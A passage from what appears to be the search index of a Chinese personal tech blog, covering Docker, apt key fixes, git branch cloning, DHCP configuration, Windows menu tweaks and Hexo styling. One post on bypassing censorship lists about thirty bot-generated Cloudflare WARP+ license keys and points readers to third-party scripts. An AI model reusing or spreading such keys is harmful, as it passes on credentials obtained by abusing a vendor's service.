在nginx-3这个容器中，使用<kbd>Ctrl</kbd>+<kbd>p</kbd>+<kbd>q<kbd>停止，停止后查看运行的容器，发现nginx-3容器仍在运行，得出结论使用快捷键退出不会导致容器停止。","tags":["Docker"],"categories":["学习过程"]},{"title":"Docker的虚悬镜像的查看和删除","url":"/2023/08/08/DanglingImage/","content":"\n### 什么是虚悬镜像\n\n虚悬镜像（dangling image）一言以蔽之：镜像既没有仓库名，也没有标签，均为\\<none>\n\n\\<none>      \\<none>     02385df0ef86    3 days ago   123 MB\n\n<!-- more -->\n\n### 查看虚悬镜像\n\n```bash\ndocker images -f dangling=true\n```\n\n### 删除虚悬镜像\n\n```bash\ndocker rmi $(docker images -q -f dangling=true)\n```","tags":["Docker"],"categories":["学习过程"]},{"title":"修复Ubuntu中的“Key is stored in legacy trusted.gpg keyring”问题","url":"/2023/08/06/Remove-aptkey/","content":"\n在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在`apt udate`时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。\n\n### 解决办法\n\n* 报错信息\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\nW: 无法下载 https://typora.io/linux/./InRelease  Could not wait for server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]\nW: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。\n```\n<!-- more -->\n\n这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。\n\n* 解决索引文件下载失败\n\n注意索引文件的关键字有`typora`，进入存储索引文件的目录`/etc/apt/sources.list.d/`，把相关的文件直接删除即可。\n\n```bash\nknight@knight:~/wechat$ cd /etc/apt/sources.list.d/\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save\ndeepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources\ngoogle-chrome.list         tickstep-aliyunpan.list.save  vscode.list\nknight@knight:/etc/apt/sources.list.d$ sudo rm -rf typora.list*\nknight@knight:/etc/apt/sources.list.d$ ls\ndeepin_appstore.list       google-chrome.list.save       vscode.list\ndeepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save\ngoogle-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources\n```\n\n* 解决有过期的存储秘钥\n\n解决完索引文件的问题之后，警告就变成了：\n\n```bash\n有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nW: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。\n```\n\n1. 首先先查看一下系统有多少存储秘钥\n\n```bash 折叠代码\nknight@knight:~/nustarain$ sudo apt-key list\n[sudo] knight 的密码： \nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/appstore.gpg\n-----------------------------------\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n\n/etc/apt/trusted.gpg.d/google-chrome.gpg\n----------------------------------------\npub   rsa4096 2016-04-12 [SC]\n      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796\nuid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) <linux-packages-keymaster@google.com>\nsub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]\nsub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]\n\n/etc/apt/trusted.gpg.d/microsoft.gpg\n------------------------------------\npub   rsa2048 2015-10-28 [SC]\n      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF\nuid             [ 未知 ] Microsoft (Release signing) <gpgsecurity@microsoft.com>\n\n/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg\n------------------------------------------------------------\npub   rsa4096 2022-07-30 [SCEA]\n      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9\nuid             [ 未知 ] tickstep <tickstep@outlook.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\n------------------------------------------------------\npub   rsa4096 2012-05-11 [SC]\n      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092\nuid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) <cdimage@ubuntu.com>\n\n/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\n------------------------------------------------------\npub   rsa4096 2018-09-17 [SC]\n      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C\nuid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) <ftpmaster@ubuntu.com>\n```\n\n2. 可以看到有很多秘钥，然后在报错信息里面找关键字，发现有`deepin`关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。\n\n```bash 折叠代码\n/etc/apt/trusted.gpg\n--------------------\npub   rsa2048 2014-12-16 [SC]\n      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51\nuid             [ 未知 ] pkg-builder <pkg-builder@packages.linuxdeepin.com>\nsub   rsa2048 2014-12-16 [E]\n\npub   rsa2048 2019-11-21 [SC]\n      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB\nuid             [ 未知 ] appstore (appstore key) <appstore@deepin.com>\nsub   rsa2048 2019-11-21 [E]\nsub   rsa2048 2019-11-21 [E]\n```\n\n3. 将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key export 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg\nWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\n```\n\n上面这条命令的意思是：导出秘钥后8位为`0A53D5BB`的秘钥，导出到`/etc/apt/trusted.gpg.d/`目录下，并且命名为`appstore.gpg`。\n\n然后去存储秘钥的目录下验证，发现存在这样的一个文件。\n\n```bash\nknight@knight:/etc/apt/trusted.gpg.d$ ls /etc/apt/trusted.gpg.d/\nappstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg\ngoogle-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg\n```\n\n4. 最后，`sudo apt-key list`查看导出的秘钥并不会消失，但是执行`sudo apt update`不会再报警告了。\n\n``` bash \n获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] \n命中:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     \n命中:20 http://file.tickstep.com/apt aliyunpan InRelease \n已下载 3,765 kB，耗时 6秒 (654 kB/s)\n正在读取软件包列表... 完成\n正在分析软件包的依赖关系树... 完成\n正在读取状态信息... 完成                 \n有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nknight@knight:~/nustarain$ \n```","tags":["Ubuntu"],"categories":["探索"]},{"title":"Git克隆指定的分支","url":"/2023/08/06/GitSpecifyBranch/","content":"\n### 问题描述\n\n在Git克隆时，有时候我们不一定要克隆主分支，更多的也会遇到克隆其他分支，而在默认的克隆中，会直接克隆主分支，那么如何克隆其他分支呢？\n\n### 解决办法\n\n执行下面的命令\n\n```git\ngit clone --branch <branchname> <remote-repo-url>\n```\n\n<!-- more -->\n\n或者\n\n```git\ngit clone -b <branchname> <remote-repo-url>\n```\n\n这里 -b 只是 --branch 的别名。\n\n这样，你就可以获取仓库中的所有分支，切换到你指定的分支，指定的分支成为本地分支用于 git push 和 git pull。但你仍然从每个分支中获取了所有文件。虽然已经达到了想要的结果，但是这样的效果并不是很令人满意。\n\n这会自动将指定的分支配置为本地分支，但仍会跟踪其他分支。类似这样：\n\n```bash\nknight@knight:~/nustarain$ git remote show origin \n* 远程 origin\n  获取地址：https://gitee.com/nustarain/nustarain.git\n  推送地址：https://gitee.com/nustarain/nustarain.git\n  HEAD 分支：main\n  远程分支：\n    hexo 已跟踪\n    main 已跟踪\n  为 'git pull' 配置的本地分支：\n    hexo 与远程 hexo 合并\n    main 与远程 main 合并\n  为 'git push' 配置的本地引用：\n    hexo 推送至 hexo (最新)\n    main 推送至 main (最新)\n```\n\n如果要单纯的只克隆一个分支，只需要加一个参数即可：\n\n```git\ngit clone --branch <branchname> --single-branch <remote-repo-url>\n```\n\n或者\n\n```git\ngit clone -b <branchname> --single-branch <remote-repo-url>\n```\n\n加上--single-branch就只会跟踪这个指定的分支了。","tags":["Git"],"categories":["学习过程"]},{"title":"移除Ubuntu桌面的家目录文件夹","url":"/2023/08/06/DelDesktopFolder/","content":"\n### 问题描述\n\n由于中文版Ubuntu的系统在个人家目录会显示中文的文件夹（桌面，文档，照片等这些），因为在进入这些目录时需要先修改输入法语言，在使用了一段时间的Ubuntu后，感到实在费劲，所以索性将这些文件夹都改成了对应的英文名字，比如桌面对应“Desktop”，后来导致Ubuntu开机之后，家目录下的文件夹全部都显示到了桌面，真的是丑到极点。\n\n后来经过一番的查找资料，终于找到了解决办法。\n\n### 解决办法\n\n1. 在Ubuntu系统中有一个文件夹管理着家目录的文件夹名字和家目录某种程度上的系统变量的关系。在这个文件夹中记录着系统变量和家目录的对应关系。\n\n<!-- more -->\n\n2. 可以直接查看这个文件`cat ~/.config/user-dirs.dirs`\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/桌面\"\nXDG_DOWNLOAD_DIR=\"$HOME/下载\"\nXDG_TEMPLATES_DIR=\"$HOME/模板\"\nXDG_PUBLICSHARE_DIR=\"$HOME/公共\"\nXDG_DOCUMENTS_DIR=\"$HOME/文档\"\nXDG_MUSIC_DIR=\"$HOME/音乐\"\nXDG_PICTURES_DIR=\"$HOME/图片\"\nXDG_VIDEOS_DIR=\"$HOME/视频\"\n```\n\n3. 上面是我修改完之前的样子，在修改之后是这样的：\n\n```bash 折叠代码\n# This file is written by xdg-user-dirs-update\n# If you want to change or add directories, just edit the line you're\n# interested in. All local changes will be retained on the next run.\n# Format is XDG_xxx_DIR=\"$HOME/yyy\", where yyy is a shell-escaped\n# homedir-relative path, or XDG_xxx_DIR=\"/yyy\", where /yyy is an\n# absolute path. No other format is supported.\n# \nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Template\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Document\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Picture\"\nXDG_VIDEOS_DIR=\"$HOME/Viedo\"\n```\n\n4. 修改完这个配置文件，然后把家目录的对应文件夹的名字修改为与配置文件一致就OK了！\n\n```bash\nknight@knight:~/.ssh$ cd ~\nknight@knight:~$ ls\naliyun  Desktop   Downloads  nustarain          Public    snap      Viedo\nchrome  dingtalk  Music      package-lock.json  qq        sougou    vs_code\nclash   Document  node       Picture            qq_music  Template  wechat\n```\n\n5. 关机，重启，就会发现桌面的家目录文件夹全都消失了。","tags":["Ubuntu"],"categories":["探索"]},{"title":"Linux配置DHCP服务器","url":"/2023/07/27/conf-dhcp/","content":"\n关于DHCP的配置是在很久之前学习配置的，并没有整理成册，今天闲下心来再把关于DHCP配置的方法回顾一下。\n\n### DHCP配置流程\n\n1. 下载软件包\n\n```bash\nyum install -y dhcp-server\n```\n\n从Centos8开始，关于DHCP的配置，软件包就变成了“dhcp-server”这是服务器端的软件包，与此相对应的还有客户端使用的“dhcp-client”。\n\n<!-- more -->\n\n2. 复制配置文件\n\ndhcp的配置文件是`/etc/dhcp/dhcpd.conf`，但是比较鸡肋的是，这个配置文件是空的，只有三行注释，但是dhcp提供了一个模板文件`/usr/share/doc/dhcp-server/dhcpd.conf.example`，可以直接拷贝过去使用。\n\n因为配置文件有很多注释，看起来非常杂乱，所以执行以下这条命令，直接带走所有注释。\n\n```bash\negrep -v \"^#|^$\" /usr/share/doc/dhcp-server/dhcpd.conf.example > /etc/dhcp/dhcpd.conf\n```\n\n3. 配置文件内容及含义\n\n```bash\n# 定义全局参数：默认搜索域\noption domain-name \"blog.nustarain.com\";\n# 定义全局参数：域名服务器（若是多个域名服务器使用逗号间隔）\noption domain-name-servers ns1.nustarain.com;\n# 定义全局参数：默认租期\ndefault-lease-time 600;\n# 定义全局参数。最大租期\nmax-lease-time 7200;\nlog-facility local7;\n# 定义网络号为10.8.7.0子网掩码为255.255.255.0的子网\nsubnet 10.8.7.0 netmask 255.255.255.0 {\n  # 子网IP地址池的范围\n  range 10.8.7.10 10.8.7.253;\n  # 设置子网的默认网关\n  option routers 10.8.7.254;\n  # 设置子网的广播地址\n  option broadcast-address 10.8.7.255;\n  default-lease-time 600;\n  max-lease-time 7200;\n}\n# 向特殊主机分配特定的IP，当要给多个特殊的主机分配IP时，host 后的名称要求必须唯一\nhost fantasia {\n  # 指定主机的MAC地址\n  hardware ethernet 00:0c:29:af:33:58;\n  # 指定要分配的IP地址\n  fixed-address 10.8.7.68;\n}\n```\n\n在整个DHCP的配置中，要注意DHCP配置文件的语法规则，尤其是分号的使用，稍不留神就会报错。\n配置完配置文件之后，可以使用`dhcpd -t`来进行语法检查，出现下面的语句表示没有错误，反之就要检查错误了。\n\n```bash\nInternet Systems Consortium DHCP Server 4.3.6\nCopyright 2004-2017 Internet Systems Consortium.\nAll rights reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nldap_gssapi_principal is not set,GSSAPI Authentication for LDAP will not be used\nNot searching LDAP since ldap-server, ldap-port and ldap-base-dn were not specified in the config file\nConfig file: /etc/dhcp/dhcpd.conf\nDatabase file: /var/lib/dhcpd/dhcpd.leases\nPID file: /var/run/dhcpd.pid\nSource compiled to use binary-leases\n```\n\nPlease remember：Practice makes perfect.\n\n### 客户机获取IP地址\n\n相比服务器端的配置，客户机的操作就比较简单一点。\n\n1. 下载软件包。\n\n```bash\nyum install -y dhcp-client\n```\n\n2. （可选），如果当前网卡已经是动态获取的模式，那么就不需要改配置文件了，如果网卡是静态指定的，那么就需要修改一下。网卡配置文件路径`/etc/sysconfig/network-scripts/ifcfg-ens160`，修改里面的`BOOTPROTO=dhcp`，保存退出。\n\n3. 执行命令更新重启网卡。\n\n```bash\nsystemctl restart NetworkManager\nnmcli c d ens160\nnmcli c up ens160\n```\n\n4. 相关命令。\n\n```bash\ndhclient ens160    # 自动获取IP地址\ndhclient -r ens160    # 释放当前IP\n```","tags":["Linux"],"categories":["技术"]},{"title":"科学上网的终极解决方案","url":"/2023/07/25/science-network/","content":"\n从我有了第一台电脑后，science online的手段也逐渐见证着我的成长，从最初的浏览器插件上网，到SSR的小飞机，再到V2ray，以及后面陪伴我最久的clash。可以说已经是身经百战的老油条了。到今天我又遇到了一个具有里程碑式的science online手段**CloudFlare+Warp+ 优选IP**。\n\nCloudFlare拥有极高的业界权威，拥有顶尖的技术团队，拥有最安全的网络方案，他们公司的推出的science online技术那是无形中代表了一个技术标准的。在我实际体验下来，效果确实非常好，很舒服。\n\n<!-- more -->\n\n### 环境准备\n\n虽说是教程，但可不是从0开始的教程。\n\n* 需要拥有telegram账号和客户端，客户端可以是安卓、windows、Mac、iOS、Linux。\n\n* [telegram官网](https://telegram.org/)\n\n### 获取Warp+的永久免费流量\n\n需要在telegram里搜索一个机器人，机器人叫“warp+ bot”，但是我试了一下，直接搜是搜不出来的，后来发现可以通过链接直接找到他，[链接地址](https://t.me/generatewarpplusbot)\n\n![telegram](./science-network/1.jpg)\n\n* 找到这个机器人之后，发送指令`/generate`\n\n* 然后他会让你关注两个类似公众号的东西，就是图中的`Warp Plus`和`akame.moe enjoyers`直接按他的意思进行关注\n\n* 再次发送`/generate` 然后他会进行真人验证，给你出一道一位数相加的数学题\n\n* 按照他的题，把答案写在命令之后，比如图中的`/generate 8`，然后就可以拿到一个秘钥，把这个秘钥留好，待会要用到。（其实不留好也没关系，丢了可以再申领一个，而且每个秘钥含的流量已经超过2EB了，所以说根本用不完，就差把永久免费写在脑门上了）\n\n我也向大家提供几个可以直接使用的秘钥：\n\n```bash 折叠代码\n🔐 Key: T23Xt4d0-w6J8K04D-18l5xeE6 (24598562 GB)\n🔐 Key: A7o25Ti0-6L73vi2x-85oL63gt (24598562 GB)\n🔐 Key: l8PNO546-Lt90kn31-O659R1rZ (24598562 GB)\n🔐 Key: 8Rh75w0a-7xO04f5W-B32tI8n9 (24598562 GB)\n🔐 Key: jmB9306F-789SI6ph-7S365JVv (24598562 GB)\n🔐 Key: 164biRE3-ct261Rh3-8y9RC6L5 (24598562 GB)\n🔐 Key: 73sH81gV-7dDQ239P-5br73p6L (24598562 GB)\n🔐 Key: 9BH18g0q-8TV9U6r4-zcDr8703 (24598562 GB)\n🔐 Key: w9L6WQ14-t375aI2F-91j27zEW (24598562 GB)\n🔐 Key: L76Hzc89-pN9r36S0-T85Jw0z9 (24598562 GB)\n🔐 Key: hV25y10g-0Hi678gc-9b06HL5F (24598562 GB)\n🔐 Key: 4BLI280U-B5c9d17X-57b89Njn (24598562 GB)\n🔐 Key: 0e3d75yj-ga82N70x-YG3a5C06 (24598562 GB)\n🔐 Key: N2C143ct-uea678k1-8mUot240 (24598562 GB)\n🔐 Key: 6y4g9f7j-H198qdA6-9F2G8vw0 (24598562 GB)\n🔐 Key: EGR3r108-eU0m381t-8Ec26i9t (24598562 GB)\n🔐 Key: zg2B0W41-S16ye8m5-kEQ64R05 (24598562 GB)\n🔐 Key: vgs159Q0-6OQe9v07-aj2385TU (24598562 GB)\n🔐 Key: 6dU2q39L-207jq8nP-3V4L6Sl2 (24598562 GB)\n🔐 Key: 19Gk4bL0-9V8XPS64-g72TEu90 (24598562 GB)\n🔐 Key: C2045eQc-n0841qKY-4vV3jY08 (24598562 GB)\n🔐 Key: p58J1O4H-P14tT65z-8Rr36mv4 (24598562 GB)\n🔐 Key: 24n6m9eh-9T0jH35K-5k71A9mf (24598562 GB)\n🔐 Key: 8dIB52E1-3s19ar7z-apS65f73 (24598562 GB)\n🔐 Key: z4jG2I08-ha5Y2c17-5U8qi39F (24598562 GB)\n🔐 Key: 2mp506db-L57S9Mu2-ey2WI461 (24598562 GB)\n🔐 Key: 13R58eyJ-d79iD3I0-7Z64mz9L (24598562 GB)\n🔐 Key: 154vY2qO-Kb51S83l-2J04FdQ7 (24598562 GB)\n🔐 Key: 132oL6bq-K4S3oz05-h5324nxf (24598562 GB)\n🔐 Key: f107WP6Q-g1e3wF74-18Q7lt5S (24598562 GB)\n```\n\n### 下载代理工具\n\n这次需要的代理工具是wireguard，[官方下载链接](https://www.wireguard.com/install/)\n\n[备用下载地址](https://pan.baidu.com/s/1Dlg26xlYBnfWNVXx0PWTdA?pwd=trha)\n提取码：trha\n\n下载完直接安装就OK。\n\n这是软件的截图。\n\n![wireguard软件截图](./science-network/2.png)\n\n新用户没有配置是不会有配置信息的\n\n* 首先左下角找到这个下拉框，点击新建空隧道\n\n* 会让你起一个名字，随便起一个名字就好\n\n* 公钥的部分不要动\n\n* 再往下的文本块是配置信息，然后把画面停在这里，最小化，我们去生成配置信息\n\n### 生成配置信息\n\n利用一个在线的工具生成配置信息，[工具链接地址](https://replit.com/@misaka-blog/wgcf-profile-generator?v=1)\n\n![网站截图](./science-network/3.png)\n\n进入网站后，点击右上角的Run，稍等片刻\n\n![开始配置](./science-network/4.png)\n\n出现这个画面后，因为我们使用的是秘钥，对应的选项是2，输入2后回车。\n\n![开始配置](./science-network/5.png)\n\n这里让输入秘钥，就是之前在telegram获取的秘钥，粘贴在这里后回车。\n\n之后会要求输入一个随机设备名，随便输入一个字符串回车就好。\n\n![开始配置](./science-network/6.png)\n\n生成的红色部分就是配置信息，把配置信息复制下来，然后粘贴在wireguard的文本块里，就像这样。\n\n![开始配置](./science-network/7.png)\n\n最后保存配置信息。\n\n大多数情况下是没有办法直接使用的，因为现在拿到的IP并不是最优IP，所以需要另一个工具来帮助筛选最优的IP，需要注意的是，如果目前有在使用任何的代理或者science online工具必须要停下来，不然会极度影响最优IP的筛选。\n\n### 筛选最优IP\n\n[工具下载链接](https://gitlab.com/Misaka-blog/warp-script/-/blob/main/files/warp-yxip/warp-yxip-win.7z)\n\n[备用下载链接](https://pan.baidu.com/s/1UZZsxrOWu-PglAx9IYFBKA?pwd=je5f)\n提取码：je5f\n\n这个工具是完全免费开源的，可以放心使用。\n\n下载完解压，有一个`warp-yxip.bat`的文件，双击运行\n\n![运行效果](./science-network/8.png)\n\n选择IPV4的筛选，输入1，回车，等待片刻，进程运行完毕后，会在工具的目录下生成一个result的文件使用Excel打开。\n\n![效果如图](./science-network/9.png)\n\n* LOSS 是丢包率\n\n* DELAY 是延迟\n\n默认会把结果按从优到差进行排序，只需要从前面几个抽一个，复制好IP和端口号然后替换掉wireguard配置文件里的最后一项，比如`Endpoint = 162.159.192.160:894`。\n\n补充一点，在wireguard里，如果需要再对配置文件进行更改，可以直接右击配置名称，选择“编辑所选隧道”。\n\n配置到这里，就完成了，可以进行连接，开始science online旅程了。","tags":["科学上网"],"categories":["小玩意儿"]},{"title":"Win11切换Win10经典右击菜单栏","url":"/2023/07/21/classic-menu/","content":"\n相信有不少升级为Win11的小伙伴对Win11的折叠右击菜单非常不舒服，平常只需要一次右击的事情，现在还要展开更多，再去找需要的工具。非常影响使用体验，接下来，告诉大家不用下载任何第三方软件，也不用手动修改注册表，只需要执行两条命令就会自动修改注册表的方法。\n\n### 切换Win10经典右击菜单栏\n\n<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n<!-- more -->\n\n```bash\nreg add \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\InprocServer32\" /f /ve\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```\n\n### 恢复Win11右击菜单栏\n\n既然可以切换到Win10的菜单栏，那自然也可以恢复为Win11的菜单栏。同样的，<kbd>Win</kbd>+<kbd>R</kbd>，输入`cmd`回车，紧接着复制并执行下面两条命令。\n\n```bash\nreg delete \"HKCU\\Software\\Classes\\CLSID\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\" /f\n```\n\n```bash\ntaskkill /f /im explorer.exe & start explorer.exe\n```","tags":["Windows"],"categories":["小玩意儿"]},{"title":"设置博客背景动态特效","url":"/2023/07/17/FlyLine/","content":"\n### 修改配置文件\n\n静态的博客实在是太单调了，增加一点动态的效果吧。\n\n1. 同添加背景图片一样，同样需要打开一个开关，也就是取消footer这个注释。\n\n<!-- more -->\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n  ```\n\n2. 取消注释以后，创建这样的一个文件source/_data/footer.swig，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```js\n<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>\n```\n\n* color设置的是线条的RGB值。\n* opacity设置的是类似透明度的数值。\n* count设置的是线条的数量。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","tags":["博客美化"],"categories":["博客搭建"]},{"title":"设置博客背景图片","url":"/2023/07/17/BGPic/","content":"\n我一直使用的是Next的主题，这个主题默认是可以自定义一些样式的。\n\n### 添加图片\n\n首先选择一张心仪的背景图片，添加到themes/next/source/images/xx.jpg。我建议图片的大小最好控制一下，最好控制在400k-500K左右，动辄几兆大小的背景图片网页加载起来会很吃力，非常影响实际体验。\n\n<!-- more -->\n\n### 取消注释\n\n然后需要打开这个开关，也就是取消style这个注释\n\n```bash 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  #footer: source/_data/footer.swig\n  #bodyEnd: source/_data/body-end.njk\n  #variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n### 创建文件\n\n取消注释以后，创建这样的一个文件source/_data/styles.styl，需要注意的是，这个source是站点目录下的source，而不是主题目录下的source。\n\n创建好之后，在文件插入以下代码：\n\n```bash\nbody {\n  background:url(/images/xx.jpg);\n  background-repeat: no-repeat;\n  background-attachment:fixed;\n  background-position:100% 100%;\n}\n```\n\n* background:url 为图片路径，也可以直接使用链接。\n* background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕\n* background-attachment：背景是否随着网页上下滚动而滚动，fixed 为固定\n* background-size：图片展示大小，这里设置 100%，100% 的意义为：如果背景图片不能全屏，那么是否通过拉伸的方式将背景强制拉伸至全屏显示。\n\n重新生成一下配置，就会出现效果了。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","tags":["博客美化"],"categories":["博客搭建"]},{"title":"博客评论系统之changyan","url":"/2023/07/17/changyan-comment/","content":"\n### 搭建原因\n\n之前在博客搭建了评论的板块，但是因为使用的是gitalk的评论功能，如果访客要进行评论的话，首先必须拥有一个github的账号，但绝大多数人如果不做这一行，不向开发靠拢，就很大程度上没有github的账号。基于这样的原因，我又重新寻找评论的插件，终于找到了适合国人的评论插件“畅言”。畅言是支持手机号、QQ账号、微信账号登录使用的，很符合我的需求，于是简单了解了一下搭建的方法，在这里分享给大家。\n\n### 条件准备\n\n1. 使用畅言评论，我们首先要去[畅言评论官网](https://changyan.kuaizhan.com/)注册一个账号。\n\n<!-- more -->\n\n紧接着我们需要添加一个站点，按照要求来就OK。站点名称随便输入，网址是你的网站的域名，白名单选填，直接跳过就OK，站点类型按照下拉框选择就好，网站logo有就添加，没有可以不添加。总的来讲，只有站点网站这一个框比较重要。\n\n![添加站点](./changyan-comment/1.png)\n\n2. 找到ID和SECRET。\n\n注册好之后，在后台总览可以找到这两个参数，这两个参数待会还有别的用处。\n\n![添加站点](./changyan-comment/2.png)\n\n3. 修改NEXT的主题配置文件。\n\n将comment的active值修改为changyan。\n\n```bash\ncomments:\n  # Available values: tabs | buttons\n  style: tabs\n  # Choose a comment system to be displayed by default.\n  # Available values: disqus | disqusjs | changyan | livere | gitalk | utterances\n  active: changyan\n```\n\n然后进行changyan的主配置修改，将enable值改为true，下面的appid和appkey对应畅言官网的APP ID和APP SECRET。\n\n```bash\nchangyan:\n  enable: true # false\n  appid: c*******s\n  appkey: 48a****b8**2328cd*****ab****50d7\n  # Show comments count\n  count: true\n```\n\n修改完成后，可以在博客上看到畅言评论的评论区了，如下图所示：\n\n![添加站点](./changyan-comment/3.png)\n\n4. 